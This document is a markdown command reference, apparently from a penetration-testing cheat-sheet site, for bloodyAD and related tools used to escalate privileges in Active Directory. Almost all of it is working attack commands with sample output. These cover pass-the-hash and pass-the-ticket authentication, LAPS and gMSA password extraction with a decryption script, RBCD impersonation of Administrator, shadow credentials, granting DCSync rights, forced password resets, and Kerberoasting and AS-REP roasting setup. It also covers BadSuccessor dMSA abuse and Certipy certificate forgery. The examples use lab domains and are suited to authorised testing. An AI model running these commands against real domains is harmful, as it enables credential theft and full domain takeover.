---
title: "bloodyAD — Active Directory Privilege Escalation from Linux"
description: "The complete reference for bloodyAD: authentication methods, LAPS extraction (v1 and v2), gMSA password reading, RBCD, shadow credentials, DCSync, ADCS abuse, BadSuccessor (dMSA), object restoration, and every ACL abuse technique in between."
category: "Active Directory"
tools: [bloodyAD, Impacket, Certipy, BloodHound]
updated: 2026-07-15
tags: [active-directory, bloodyad, privesc, acl-abuse, ldap, laps, rbcd, dcsync, shadow-credentials, adcs]
---

## Index

| Section | Description |
|---|---|
| [1. Authentication & Global Arguments](#1-authentication--global-arguments) | Password, PTH, PTT, certificates, Kerberos |
| [2. BloodHound Collection](#2-bloodhound-collection) | Collect AD data for BloodHound CE |
| [3. LAPS — Local Administrator Password Solution](#3-laps--local-administrator-password-solution) | Read LAPS v1 and v2 passwords |
| [4. gMSA — Group Managed Service Accounts](#4-gmsa--group-managed-service-accounts) | Read managed passwords |
| [5. Reconnaissance — get commands](#5-reconnaissance--get-commands) | Objects, membership, writables, DNS, trusts |
| [6. Object Manipulation — set commands](#6-object-manipulation--set-commands) | Passwords, owners, attributes, restoration |
| [7. Group Membership](#7-group-membership) | Add and remove members |
| [8. RBCD — Resource-Based Constrained Delegation](#8-rbcd--resource-based-constrained-delegation) | Configure and abuse delegation |
| [9. Shadow Credentials](#9-shadow-credentials) | Key Credential abuse via msDS-KeyCredentialLink |
| [10. DCSync](#10-dcsync) | Grant and remove DCSync rights |
| [11. GenericAll](#11-genericall) | Full control over objects |
| [12. SPN Manipulation](#12-spn-manipulation) | Write SPNs for Kerberoasting |
| [13. User Account Control (UAC)](#13-user-account-control-uac) | Modify account flags (AS-REP, delegation) |
| [14. BadSuccessor (dMSA) — Windows Server 2025](#14-badsuccessor-dmsa--windows-server-2025) | Abuse delegated Managed Service Accounts |
| [15. ADCS / ESC Abuse](#15-adcs--esc-abuse) | Certificate Services reconnaissance |
| [16. Restore Deleted Objects](#16-restore-deleted-objects) | Reanimate tombstones |
| [17. Remove Commands](#17-remove-commands) | Undo changes |

---

## 1. Authentication & Global Arguments

### Cleartext password

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' <command>
```

### Pass-the-Hash (PTH)

Format: `LMHASH:NTHASH`. Use `:` prefix for empty LM hash.

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p ':NTHASH' <command>
```

### Pass-the-Ticket (PTT) with ccache

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -k ccache=/path/to/ticket.ccache <command>
```

### Kerberos with password

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' -k <command>
```

### Kerberos with AES/RC4 key

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p <AES_KEY> -f aes <command>
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p <RC4_KEY> -f rc4 <command>
```

### Certificate (PKINIT / Schannel)

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -c 'path/to/key.pem:path/to/cert.pem' <command>
```

### LDAPS (encrypted)

Add `-s` for LDAPS over TLS, `-ss` to remove all encryption/signing (debug).

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' -s <command>
```

### Useful global flags

| Flag | Description |
|---|---|
| `-H` / `--host` | DC hostname or IP |
| `-i` / `--dc-ip` | DC IP (if hostname can't resolve) |
| `--dns` | DNS server IP for AD name resolution |
| `--gc` | Connect to Global Catalog |
| `-v` | Verbosity: `QUIET`, `INFO`, `DEBUG`, `TRACE` |
| `--json` | Output in JSON format |
| `-t` | Connection timeout in seconds |

---

## 2. BloodHound Collection

### bloodyAD native collector

```bash
bloodyAD -k -d <DOMAIN> --host <DC_FQDN> get bloodhound
```

With transitive trusts (more complete results):

```bash
bloodyAD -k -d <DOMAIN> --host <DC_FQDN> get bloodhound --transitive
```

Save to a specific path:

```bash
bloodyAD -k -d <DOMAIN> --host <DC_FQDN> get bloodhound --path /tmp/collector.zip
```

### bloodhound-ce-python (with ticket)

```bash
bloodhound-ce-python -c All -d <DOMAIN> -u <USER> -k -no-pass -dc <DC_FQDN> --zip -ns <DC_IP>
```

### RustHound (with Kerberos)

```bash
rusthound-ce --kerberos -f <DC_FQDN> -d <DOMAIN> -c All -i <DC_IP> -n <DC_IP> -z -o .
```

---

## 3. LAPS — Local Administrator Password Solution

### Easiest method (auto-detect version)

```bash
bloodyAD --host <DC_FQDN> -d <DOMAIN> -k msldap laps
```

### LAPS v2 — read encrypted password

```bash
bloodyAD --host <DC_FQDN> -d <DOMAIN> -k get object "<COMPUTER>$" --attr msLAPS-EncryptedPassword
```

### LAPS v1 — read plaintext password

```bash
bloodyAD --host <DC_FQDN> -d <DOMAIN> -k get object "<COMPUTER>$" --attr ms-Mcs-AdmPwd
```

### Read LAPS password history (v2)

Useful when the password is desynchronized between the DC and the host.

```bash
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -k get object "<COMPUTER>$" --attr msLAPS-EncryptedPasswordHistory
```

### Find all computers with LAPS enabled

```bash
bloodyAD -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC_IP> get search \
  --filter '(ms-Mcs-AdmPwd=*)' \
  --attr dNSHostName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
```

### Decrypting a LAPS v2 password

The `msLAPS-EncryptedPassword` value is a base64-encoded DPAPI-NG blob. To decrypt it:

```bash
sudo apt install python3-krb5
pip install dpapi-ng
```

Python script:

```python
import base64
import dpapi_ng

# 1. Paste the base64 blob from bloodyAD output
blob_b64 = "QqXcAYvJ1WLQ..."
full_bytes = base64.b64decode(blob_b64)

# 2. Skip the 16-byte LAPSv2 header
dpapi_ng_blob = full_bytes[16:]

# 3. Decrypt using the DC's Kerberos context
decrypted = dpapi_ng.ncrypt_unprotect_secret(
    dpapi_ng_blob,
    server='DC01.domain.local',
    auth_protocol='kerberos'
)

# 4. Output (LAPSv2 uses UTF-16-LE)
print(decrypted.decode('utf-16-le'))
```

Output example:

```json
{"n":"lab-admin","t":"1dca54262d5c98b","p":"f6f$e[63$4kI"}
```

**Note:** In some cases the password can be desynchronized (DC thinks it was updated but the host never received it). Check the history attribute if this happens.

---

## 4. gMSA — Group Managed Service Accounts

### Check who can read the managed password

```bash
bloodyAD --host <DC_FQDN> -d <DOMAIN> -k get object "CN=<GMSA>,OU=ServiceAccounts,DC=<DOMAIN>,DC=<TLD>" --attr msDS-GroupMSAMembership
```

### Read the gMSA password

```bash
bloodyAD --host <DC_FQDN> -d <DOMAIN> -k msldap gmsa
```

### Alternative — read msDS-ManagedPassword directly

```bash
bloodyAD --host <DC_FQDN> -d <DOMAIN> -k get object '<GMSA>$' --attr msDS-ManagedPassword
```

### With Impacket (for comparison)

```bash
python3 -c "
from impacket.ldap import ldapasn1 as ldapasn1
# ... (Impacket gMSA reader)
"
```

---

## 5. Reconnaissance — get commands

### Get object attributes

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' get object '<TARGET>'
```

### Get object with resolved security descriptor

Translates SIDs to names — makes the output human-readable.

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' get object '<TARGET>' --resolve-sd
```

### Get specific attributes

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' get object '<TARGET>' --attr <ATTR1> <ATTR2>
```

### Get membership

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' get membership <TARGET>
```

Without recursion:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' get membership <TARGET> --no-recurse
```

### Get writable objects

Without ticket:

```bash
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --host <DC_IP> get writable
```

With ticket:

```bash
bloodyAD -k ccache=/path/to/ticket.ccache -d <DOMAIN> --host <DC_IP> get writable
```

With details (shows exactly which attributes are writable):

```bash
bloodyAD -k ccache=/path/to/ticket.ccache -d <DOMAIN> --host <DC_IP> get writable --detail
```

### Get children of an object

```bash
bloodyAD -H <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' get children 'DC=<DOMAIN>,DC=<TLD>' --otype user
```

Types: `user`, `computer`, `group`, `organizationalUnit`, `container`, `groupPolicyContainer`, `msDS-GroupManagedServiceAccount`.

### Get DNS records

```bash
bloodyAD -H <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' get dnsDump
```

Filter by zone:

```bash
bloodyAD -H <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' get dnsDump --zone <DOMAIN>
```

### Get trusts

```bash
bloodyAD -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC_IP> get trusts
```

### Search LDAP

```bash
bloodyAD -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC_IP> get search \
  --filter '(objectClass=trustedDomain)' \
  --attr name trustDirection trustAttributes flatName
```

### Get GPO details

```bash
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -k get object \
  'CN={CEDD1760-5DAA-4089-83E3-50EAB2563D2A},CN=Policies,CN=System,DC=<DOMAIN>,DC=<TLD>' \
  --resolve-sd
```

---

## 6. Object Manipulation — set commands

### Set a specific attribute

Format: `set object <TARGET> <ATTRIBUTE> -v <VALUE>`

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' set object '<TARGET>' <ATTR> -v '<VALUE>'
```

Example — set `scriptPath`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' set object 'l.wilson' scriptPath -v 'printerDetect.bat'
```

Example — set `managedBy`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' set object 'CN=RODC01,OU=Domain Controllers,DC=<DOMAIN>,DC=<TLD>' managedBy -v "CN=Liz Wilson ADM,CN=Users,DC=<DOMAIN>,DC=<TLD>"
```

### Force password change (ForceChangePassword)

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' set password <TARGET> '<NEWPASSWORD>'
```

### Change owner (WriteOwner)

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' set owner <TARGET> <TRUSTEE>
```

Example:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' set owner "SENTINEL SERVICE ACCOUNT READERS" "sentinel-Fbq6TH$"
```

### Restore a deleted object

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' set restore '<DELETED_OBJECT_DN>' --newParent '<TARGET_OU_DN>'
```

Example:

```bash
bloodyAD --host dc01.trask.hsm -d trask.hsm -u svc_dcsecure_agent -k set restore \
  'CN=svc_dcsecure_core\0ADEL:c9defc7e-ab67-4103-9a05-f6ed8b4cb339,CN=Deleted Objects,DC=trask,DC=hsm' \
  --newParent 'OU=Legacy Service Compatible Access,DC=trask,DC=hsm'
```

Alternative (by name):

```bash
bloodyAD --host dc01.trask.hsm -d trask.hsm -u svc_dcsecure_agent -k set restore 'svc_dcsecure_core' \
  --newParent "OU=Legacy Service Compatible Access,DC=trask,DC=hsm"
```

---

## 7. Group Membership

### Add member to group

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add groupMember '<GROUP>' '<MEMBER>'
```

Example:

```bash
bloodyad -u l.wilson_adm -p 'NuevaPasswordAdm123!' -d garfield.htb --host 10.129.23.14 add groupMember "RODC ADMINISTRATORS" "l.wilson_adm"
```

### Verify membership

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' get object '<GROUP>' --attr member
```

### Remove member from group

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' remove groupMember '<GROUP>' '<MEMBER>'
```

---

## 8. RBCD — Resource-Based Constrained Delegation

### Check for msDS-AllowedToActOnBehalfOfOtherIdentity write

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' get writable --detail
```

Look for:

```
distinguishedName: CN=RODC01,OU=Domain Controllers,DC=<DOMAIN>,DC=<TLD>
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
```

### Create a fake computer

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add computer '<COMPUTER_NAME>' '<PASSWORD>'
```

Example:

```bash
bloodyAD -u l.wilson_adm -p 'NuevaPasswordAdm123!' -d garfield.htb --host 10.129.23.14 add computer 'COMPU_FALSA' 'PasswordSegura123!'
```

### Configure RBCD

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add rbcd '<TARGET>$' '<FAKE_COMPUTER>$'
```

Example:

```bash
bloodyad -u l.wilson_adm -p 'NuevaPasswordAdm123!' -d garfield.htb --host 10.129.23.14 add rbcd RODC01$ COMPU_FALSA$
```

The output provides the `badS4U2proxy` command:

```
[+] COMPU_FALSA$ can now impersonate users on RODC01$ via S4U2Proxy
[+] e.g. badS4U2proxy 'kerberos+pw://garfield.htb\l.wilson_adm:NuevaPasswordAdm123%21@10.129.23.14/?serverip=10.129.23.14' 'HOST/RODC01$@garfield.htb' 'Administrator@garfield.htb'
```

### Get the ticket with badS4U2proxy

```bash
badS4U2proxy 'kerberos+pw://<DOMAIN>\<COMPUTER>$:<PASSWORD>@<DC_IP>/?serverip=<DC_IP>' 'HOST/<TARGET>.<DOMAIN>@<DOMAIN>' 'Administrator@<DOMAIN>'
```

### Convert and use the ticket

```bash
# Save the base64 ticket
vim kirbi.txt

# Clean and convert
cat kirbi.txt | tr -d ' \n\r' | base64 -d > ticket_limpio.kirbi

# Convert to ccache
ticketConverter.py ticket_limpio.kirbi admin_rodc.ccache

# Export
export KRB5CCNAME=$(pwd)/admin_rodc.ccache
```

### RBCD on users without SPN (Machine Quota 0)

```bash
bloodyad -u <USER> -p '<PASSWORD>' -d <DOMAIN> --host <DC_IP> add rbcd <DC>$ <USER>
```

Example:

```bash
bloodyad -u CROSE -p 'newP@ssword2022' -d phantom.vl --host 10.129.234.63 add rbcd DC$ CROSE
```

---

## 9. Shadow Credentials

### Add shadow credentials

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add shadowCredentials <TARGET>
```

Save the certificate to a specific path:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add shadowCredentials <TARGET> --path /tmp/
```

**Requirements:** DC must run Windows Server 2016+ (msDS-KeyCredentialLink), AD CS must be enabled for PKINIT.

### Remove shadow credentials

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' remove shadowCredentials <TARGET> --key <KEY_FROM_OUTPUT>
```

---

## 10. DCSync

### Grant DCSync rights

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync '<TRUSTEE>'
```

Example:

```bash
bloodyAD -u john -p 'Password123' -d corp.local --host 192.168.1.10 add dcsync "john"
```

### Remove DCSync rights

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' remove dcsync '<TRUSTEE>'
```

---

## 11. GenericAll

### Grant GenericAll

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add genericAll <TARGET> <TRUSTEE>
```

Example:

```bash
bloodyAD --host DC01.trask.hsm -d trask.hsm -k add genericall "SENTINEL SERVICE ACCOUNT READERS" "sentinel-Fbq6TH$"
```

### Remove GenericAll

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' remove genericAll <TARGET> <TRUSTEE>
```

---

## 12. SPN Manipulation

### Check for servicePrincipalName write

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' get writable --detail
```

Look for:

```
distinguishedName: CN=Matt Mold,OU=Staff,DC=<DOMAIN>,DC=<TLD>
servicePrincipalName: WRITE
```

### Write SPN (for Kerberoasting)

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' set object '<TARGET>' servicePrincipalName -v '<SPN>'
```

Example:

```bash
bloodyAD --host dc01.trask.hsm -d trask.hsm -k set object "CN=Matt Mold,OU=Staff,DC=trask,DC=hsm" servicePrincipalName -v "pwn/matt"
```

Alternative with msldap:

```bash
bloodyAD --host <DC_FQDN> -d <DOMAIN> -k -u "<USER>" msldap addspn "CN=<TARGET>,OU=Staff,DC=<DOMAIN>,DC=<TLD>" "<SPN>"
```

After writing the SPN, Kerberoast the user.

---

## 13. User Account Control (UAC)

### Add UAC flag

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add uac '<TARGET>' -f <FLAG>
```

Multiple flags:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add uac '<TARGET>' -f DONT_REQ_PREAUTH -f DONT_EXPIRE_PASSWORD
```

### Common flags

| Flag | Effect |
|---|---|
| `DONT_REQ_PREAUTH` | Enables AS-REP Roasting |
| `TRUSTED_FOR_DELEGATION` | Enables unconstrained delegation |
| `DONT_EXPIRE_PASSWORD` | Password never expires |

### Enable AS-REP Roasting

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add uac '<TARGET>' DONT_REQ_PREAUTH
```

### Remove UAC flag

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' remove uac '<TARGET>' -f <FLAG>
```

---

## 14. BadSuccessor (dMSA) — Windows Server 2025

### Prerequisites

- Windows Server 2025 domain controller
- Write access to an OU where a dMSA can be created
- Rubeus (for ticket extraction)

### Save the TGT with Rubeus

```powershell
.\Rubeus.exe tgtdeleg /nowrap
```

### Decode and convert

```bash
cat ticket.ticket | base64 -d > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=$(pwd)/ticket.ccache
```

### Create dMSA and abuse BadSuccessor

```bash
bloodyAD -H '<DC_FQDN>' -d '<DOMAIN>' -k -u '<USER>' add badSuccessor '<DMSA_NAME>' \
  -t 'CN=<TARGET_ACCOUNT>,OU=<OU>,DC=<DOMAIN>,DC=<TLD>'
```

Example:

```bash
bloodyad -H 'dc01.checkpoint.htb' -d 'checkpoint.htb' -k -u 'ryan.brooks' add badSuccessor 'ree' \
  -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB'
```

**Output:**

```
[+] Creating DMSA ree$ in OU=DMSAHolder,DC=checkpoint,DC=htb
[+] Impersonating: CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB
...
dMSA current keys found in TGS:
AES256: 3e1e6432dcf95...
AES128: 4ef4f5f...
RC4: 5afdeaf34...

dMSA previous keys found in TGS (including keys of preceding managed accounts):
RC4: e1608eb077a...
```

The output reveals the NTLM hash of the impersonated account.

---

## 15. ADCS / ESC Abuse

### Enumerate ADCS servers

```bash
bloodyAD -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC_IP> get search \
  --filter '(objectClass=pKIEnrollmentService)' \
  --attr cn dNSHostName
```

### Check for ESC vulnerabilities

After identifying CAs, check for ESC1-ESC8 misconfigurations:

- **ESC1** — Enrollee can request a certificate for any SAN
- **ESC3** — Enrollment agent abuse
- **ESC5** — Vulnerable PKI object ACL
- **ESC6** — EDITF_ATTRIBUTESUBJECTALTNAME2 flag set
- **ESC8** — HTTP enrollment endpoint without authentication

For exploitation, combine with **Certipy**:

```bash
certipy find -u <USER>@<DOMAIN> -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout
certipy req -u <USER>@<DOMAIN> -p '<PASSWORD>' -ca <CA_NAME> -template <TEMPLATE> -upn administrator@<DOMAIN>
```

After obtaining a PFX from Certipy, use bloodyAD with `-c 'path/to/key.pem:path/to/cert.pem'` for authentication.

---

## 16. Restore Deleted Objects

### Check for Reanimate-Tombstones

```bash
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -k get object 'DC=<DOMAIN>,DC=<TLD>' \
  --attr ntsecuritydescriptor --resolve-sd | grep -B 2 "Reanimate-Tombstones"
```

Output:

```
nTSecurityDescriptor.ACL.3.Trustee: DCSecure Maintenance
nTSecurityDescriptor.ACL.3.Right: CONTROL_ACCESS
nTSecurityDescriptor.ACL.3.ObjectType: Reanimate-Tombstones
```

### Check for isDeleted and lastKnownParent write

```bash
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --host <DC_IP> get writable --detail
```

Look for:

```
distinguishedName: CN=svc_dcsecure_core\0ADEL:...,CN=Deleted Objects,DC=<DOMAIN>,DC=<TLD>
lastKnownParent: WRITE
isDeleted: WRITE
```

### Check for CreateChild permission at the destination OU

```bash
bloodyAD -u <USER> -p '<PASSWORD>' -d <DOMAIN> --host <DC_IP> get writable
```

Look for:

```
distinguishedName: OU=Legacy Service Compatible Access,DC=<DOMAIN>,DC=<TLD>
group: CREATE_CHILD
user: CREATE_CHILD
computer: CREATE_CHILD
```

### Restore the object

```bash
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -k set restore '<DELETED_OBJECT_DN>' \
  --newParent '<TARGET_OU_DN>'
```

### Verify the object is alive

```bash
bloodyAD --host <DC_FQDN> -d <DOMAIN> -u <USER> -k get object 'CN=<OBJECT>,<TARGET_OU_DN>'
```

---

## 17. Remove Commands

### Remove DCSync

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' remove dcsync <TRUSTEE>
```

### Remove GenericAll

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' remove genericAll <TARGET> <TRUSTEE>
```

### Remove group member

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' remove groupMember <GROUP> <MEMBER>
```

### Remove RBCD

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' remove rbcd <TARGET> <SERVICE>
```

### Remove shadow credentials

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' remove shadowCredentials <TARGET> --key <KEY>
```

### Remove UAC flag

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' remove uac <TARGET> -f <FLAG>
```

### Remove DNS record

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' remove dnsRecord <NAME> <DATA>
```

### Remove object

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' remove object <TARGET>
```

---

## Quick reference — ACL Abuse Matrix

| Permission | Target | Abuse | Command |
|---|---|---|---|
| **ForceChangePassword** | User | Reset password | `set password <TARGET> <NEWPASS>` |
| **GenericAll** | User | Reset password / Set SPN | `set password` / `set object` |
| **GenericAll** | Group | Add member | `add groupMember` |
| **GenericAll** | Computer | RBCD | `add rbcd` |
| **GenericWrite** | User | Set SPN | `set object servicePrincipalName` |
| **GenericWrite** | User | Shadow Credentials | `add shadowCredentials` |
| **WriteOwner** | Any | Change owner | `set owner` |
| **WriteDACL** | Any | Grant DCSync / GenericAll | `add dcsync` / `add genericAll` |
| **WriteSPN** | User | Kerberoasting | `set object servicePrincipalName` |
| **WriteAccountRestrictions** | User | AS-REP Roasting | `add uac DONT_REQ_PREAUTH` |
| **Reanimate-Tombstones** | Deleted Object | Restore | `set restore` |
| **msDS-AllowedToActOnBehalfOfOtherIdentity** | Computer | RBCD | `add rbcd` |
| **msDS-KeyCredentialLink** | User / Computer | Shadow Credentials | `add shadowCredentials` |

---

## Notes

- **`--resolve-sd`** translates SIDs to human-readable names. Always use it when inspecting ACLs.
- **`-k`** enables Kerberos authentication. Combine with `ccache=`, `kirbi=`, or `keytab=` for ticket-based auth.
- **LAPS v2** stores encrypted passwords in `msLAPS-EncryptedPassword`. The decryption requires DPAPI-NG and a Kerberos context against the DC.
- **BadSuccessor** requires Windows Server 2025 and write access to an OU. The attack creates a dMSA and impersonates a target account.
- **RBCD** requires `msDS-AllowedToActOnBehalfOfOtherIdentity` write permission on the target computer.
- **Shadow Credentials** require Windows Server 2016+ (msDS-KeyCredentialLink) and AD CS for PKINIT.
- **DCSync** requires `Replicating Directory Changes` and `Replicating Directory Changes All` rights on the domain object.
